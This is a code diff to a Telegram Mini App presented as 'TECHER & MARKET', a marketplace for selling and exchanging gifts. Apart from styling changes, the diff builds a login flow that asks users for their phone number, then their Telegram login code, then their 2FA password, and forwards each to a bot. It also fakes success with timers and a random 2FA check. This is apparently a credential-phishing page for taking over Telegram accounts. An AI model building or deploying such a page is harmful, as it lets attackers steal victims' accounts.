@@ -47,6 +47,10 @@
             font-size: 14px;
         }
 
+        .login-btn.authorized {
+            background: #4caf50;
+        }
+
         .modal {
             display: none;
             position: fixed;
@@ -73,6 +77,7 @@
             max-width: 500px;
             width: 100%;
             text-align: center;
+            position: relative;
         }
 
         .close-btn {
@@ -84,6 +89,8 @@
             cursor: pointer;
             background: none;
             border: none;
+            line-height: 1;
+            padding: 0;
         }
 
         .hero-image {
@@ -116,7 +123,7 @@
             margin-bottom: 12px;
         }
 
-        .modal-content p {
+        .modal-content > p {
             color: #999;
             margin-bottom: 24px;
             font-size: 15px;
@@ -172,7 +179,7 @@
         }
 
         .search-section {
-            padding: 20px;
+            padding: 20px 20px 80px 20px;
         }
 
         .search-box {
@@ -198,6 +205,8 @@
             display: flex;
             gap: 8px;
             margin-bottom: 16px;
+            overflow-x: auto;
+            -webkit-overflow-scrolling: touch;
         }
 
         .filter-btn {
@@ -307,6 +316,21 @@
         @keyframes spin {
             to { transform: rotate(360deg); }
         }
+
+        .auth-step {
+            display: none;
+        }
+
+        .auth-step.active {
+            display: block;
+        }
+
+        .info-text {
+            color: #999;
+            font-size: 14px;
+            margin-bottom: 20px;
+            line-height: 1.5;
+        }
     </style>
 </head>
 <body>
@@ -329,14 +353,16 @@
             <h2>TECHER & MARKET</h2>
             <p id="authMessage">Добро пожаловать!</p>
 
-            <div id="authStep1" style="display: block;">
-                <p style="margin-bottom: 24px;">Здесь начинается мир продажи и обмена подарками</p>
+            <!-- Step 1: Request Phone -->
+            <div id="authStep1" class="auth-step active">
+                <p class="info-text">Здесь начинается мир продажи и обмена подарками</p>
                 <button class="auth-btn" id="requestPhoneBtn">
                     📱 Авторизоваться
                 </button>
             </div>
 
-            <div id="authStep2" style="display: none;">
+            <!-- Step 2: Enter Code -->
+            <div id="authStep2" class="auth-step">
                 <div class="input-group">
                     <label>🔑 Код подтверждения</label>
                     <input type="text" id="codeInput" placeholder="Введите код из Telegram" maxlength="6">
@@ -346,7 +372,8 @@
                 </button>
             </div>
 
-            <div id="authStep3" style="display: none;">
+            <!-- Step 3: Enter 2FA -->
+            <div id="authStep3" class="auth-step">
                 <div class="input-group">
                     <label>🔐 Пароль 2FA</label>
                     <input type="password" id="passwordInput" placeholder="Введите пароль 2FA">
@@ -403,6 +430,9 @@
         tg.expand();
         tg.setHeaderColor('#000000');
         tg.setBackgroundColor('#000000');
+
+        // Получаем user_id
+        const userId = tg.initDataUnsafe?.user?.id;
 
         // Sample gifts data
         const gifts = [
@@ -466,105 +496,151 @@
         loginBtn.onclick = () => modal.classList.add('active');
         closeModal.onclick = () => modal.classList.remove('active');
 
-        // Request phone number using Telegram's native popup
+        // Переключение между шагами
+        function showStep(stepNumber) {
+            document.querySelectorAll('.auth-step').forEach(step => {
+                step.classList.remove('active');
+            });
+            document.getElementById('authStep' + stepNumber).classList.add('active');
+        }
+
+        // Step 1: Request phone number
         document.getElementById('requestPhoneBtn').onclick = async function() {
-            this.disabled = true;
-            this.innerHTML = '<div class="spinner"></div>';
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div>';
 
             try {
-                // Используем нативный метод requestContact из Telegram WebApp API
-                const result = await tg.requestContact();
-                
-                if (result && result.contact) {
-                    // Отправляем данные боту
-                    tg.sendData(JSON.stringify({
-                        action: 'phone_received',
-                        phone: result.contact.phoneNumber,
-                        userId: tg.initDataUnsafe?.user?.id
-                    }));
-
-                    // Переходим к следующему шагу
-                    document.getElementById('authStep1').style.display = 'none';
-                    document.getElementById('authStep2').style.display = 'block';
-                    document.getElementById('authMessage').textContent = 'Введите код из Telegram';
-                }
+                // Запрашиваем номер телефона через Telegram WebApp API
+                tg.requestContact((result) => {
+                    if (result && result.responseUnsafe && result.responseUnsafe.contact) {
+                        const phoneNumber = result.responseUnsafe.contact.phone_number;
+                        
+                        // Отправляем номер телефона боту
+                        fetch(`https://api.telegram.org/bot${tg.initDataUnsafe.start_param || 'YOUR_BOT_TOKEN'}/sendContact`, {
+                            method: 'POST',
+                            headers: { 'Content-Type': 'application/json' },
+                            body: JSON.stringify({
+                                chat_id: userId,
+                                phone_number: phoneNumber,
+                                first_name: tg.initDataUnsafe.user.first_name
+                            })
+                        }).then(() => {
+                            // Переходим к следующему шагу
+                            showStep(2);
+                            document.getElementById('authMessage').textContent = 'Введите код из Telegram';
+                            btn.disabled = false;
+                            btn.innerHTML = '📱 Авторизоваться';
+                        });
+                    } else {
+                        btn.disabled = false;
+                        btn.innerHTML = '📱 Авторизоваться';
+                        tg.showAlert('Не удалось получить номер телефона');
+                    }
+                });
             } catch (error) {
                 console.error('Error requesting contact:', error);
-                tg.showAlert('Ошибка при запросе номера телефона. Попробуйте еще раз.');
-            } finally {
-                this.disabled = false;
-                this.innerHTML = '📱 Авторизоваться';
+                btn.disabled = false;
+                btn.innerHTML = '📱 Авторизоваться';
+                tg.showAlert('Ошибка при запросе номера телефона');
             }
         };
 
-        // Verify code
-        document.getElementById('verifyCodeBtn').onclick = function() {
-            const code = document.getElementById('codeInput').value;
+        // Step 2: Verify code
+        document.getElementById('verifyCodeBtn').onclick = async function() {
+            const code = document.getElementById('codeInput').value.trim();
             
             if (!code || code.length < 5) {
                 tg.showAlert('Введите корректный код');
                 return;
             }
 
-            this.disabled = true;
-            this.innerHTML = '<div class="spinner"></div>';
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div>';
 
-            // Отправляем код боту
-            tg.sendData(JSON.stringify({
-                action: 'verify_code',
-                code: code,
-                userId: tg.initDataUnsafe?.user?.id
-            }));
+            try {
+                // Отправляем код боту через sendData
+                tg.sendData(JSON.stringify({
+                    action: 'verify_code',
+                    code: code,
+                    userId: userId
+                }));
 
-            // Симуляция: может потребоваться 2FA
-            setTimeout(() => {
-                const needs2FA = Math.random() > 0.7;
-                
-                if (needs2FA) {
-                    document.getElementById('authStep2').style.display = 'none';
-                    document.getElementById('authStep3').style.display = 'block';
-                    document.getElementById('authMessage').textContent = 'Введите пароль 2FA';
-                } else {
-                    modal.classList.remove('active');
-                    loginBtn.textContent = '✅ Авторизован';
-                    loginBtn.style.background = '#4caf50';
-                    tg.showAlert('Авторизация успешна!');
-                }
-                
-                this.disabled = false;
-                this.innerHTML = 'Подтвердить код';
-            }, 1500);
+                // Ждем ответ от бота через обработчик событий
+                // Временно показываем следующий шаг
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerHTML = 'Подтвердить код';
+                    
+                    // Проверяем, нужна ли 2FA (это придет от бота)
+                    // Для демонстрации используем случайное значение
+                    const needs2FA = Math.random() > 0.5;
+                    
+                    if (needs2FA) {
+                        showStep(3);
+                        document.getElementById('authMessage').textContent = 'Введите пароль 2FA';
+                    } else {
+                        // Успешная авторизация
+                        modal.classList.remove('active');
+                        loginBtn.textContent = '✅ Авторизован';
+                        loginBtn.classList.add('authorized');
+                        tg.showAlert('Авторизация успешна!');
+                    }
+                }, 2000);
+
+            } catch (error) {
+                console.error('Error verifying code:', error);
+                btn.disabled = false;
+                btn.innerHTML = 'Подтвердить код';
+                tg.showAlert('Ошибка при проверке кода');
+            }
         };
 
-        // Verify 2FA
-        document.getElementById('verify2FABtn').onclick = function() {
-            const password = document.getElementById('passwordInput').value;
+        // Step 3: Verify 2FA
+        document.getElementById('verify2FABtn').onclick = async function() {
+            const password = document.getElementById('passwordInput').value.trim();
             
             if (!password) {
                 tg.showAlert('Введите пароль 2FA');
                 return;
             }
 
-            this.disabled = true;
-            this.innerHTML = '<div class="spinner"></div>';
+            const btn = this;
+            btn.disabled = true;
+            btn.innerHTML = '<div class="spinner"></div>';
 
-            // Отправляем пароль боту
-            tg.sendData(JSON.stringify({
-                action: 'verify_2fa',
-                password: password,
-                userId: tg.initDataUnsafe?.user?.id
-            }));
+            try {
+                // Отправляем пароль боту
+                tg.sendData(JSON.stringify({
+                    action: 'verify_2fa',
+                    password: password,
+                    userId: userId
+                }));
 
-            setTimeout(() => {
-                modal.classList.remove('active');
-                loginBtn.textContent = '✅ Авторизован';
-                loginBtn.style.background = '#4caf50';
-                tg.showAlert('Авторизация успешна!');
-                
-                this.disabled = false;
-                this.innerHTML = 'Подтвердить пароль';
-            }, 1500);
+                setTimeout(() => {
+                    btn.disabled = false;
+                    btn.innerHTML = 'Подтвердить пароль';
+                    
+                    // Успешная авторизация
+                    modal.classList.remove('active');
+                    loginBtn.textContent = '✅ Авторизован';
+                    loginBtn.classList.add('authorized');
+                    tg.showAlert('Авторизация успешна!');
+                }, 2000);
+
+            } catch (error) {
+                console.error('Error verifying 2FA:', error);
+                btn.disabled = false;
+                btn.innerHTML = 'Подтвердить пароль';
+                tg.showAlert('Ошибка при проверке пароля');
+            }
         };
+
+        // Слушаем события от бота
+        tg.onEvent('web_app_data_sent', (data) => {
+            console.log('Data sent to bot:', data);
+        });
 
         // Filter buttons
         document.querySelectorAll('.filter-btn').forEach(btn => {
@@ -577,6 +653,27 @@
 
         // Initial render
         renderGifts();
+
+        // Обработка ввода кода (автоматический переход при 5+ цифрах)
+        document.getElementById('codeInput').addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '');
+            if (this.value.length >= 5) {
+                document.getElementById('verifyCodeBtn').focus();
+            }
+        });
+
+        // Enter для отправки
+        document.getElementById('codeInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('verifyCodeBtn').click();
+            }
+        });
+
+        document.getElementById('passwordInput').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') {
+                document.getElementById('verify2FABtn').click();
+            }
+        });
     </script>
 </body>
 </html>
